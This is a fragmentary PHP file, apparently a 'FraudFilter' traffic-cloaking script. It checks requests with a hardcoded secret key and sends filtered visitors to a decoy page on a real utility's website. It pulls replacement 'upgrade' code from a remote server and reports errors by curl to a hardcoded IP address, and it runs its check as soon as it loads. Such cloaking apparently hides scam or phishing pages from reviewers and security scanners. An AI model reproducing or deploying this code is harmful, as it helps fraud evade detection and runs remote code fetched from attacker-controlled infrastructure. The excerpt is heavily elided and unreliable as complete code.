...
class FraudFilterDetector_3a0kj {
    ...
    function isSignatureValid($sign, $time) {
        $str = 'e2908c54-9dd7-4f1d-a710-bc56bd7280e1.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.idahopower.com/');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: e2908c54-9dd7-4f1d-a710-bc56bd7280e1',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: e2908c54-9dd7-4f1d-a710-bc56bd7280e1';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: e2908c54-9dd7-4f1d-a710-bc56bd7280e1';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=3a0kj&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_3a0kj = new FraudFilterDetector_3a0kj();
$fraudFilterDetector_3a0kj->check();
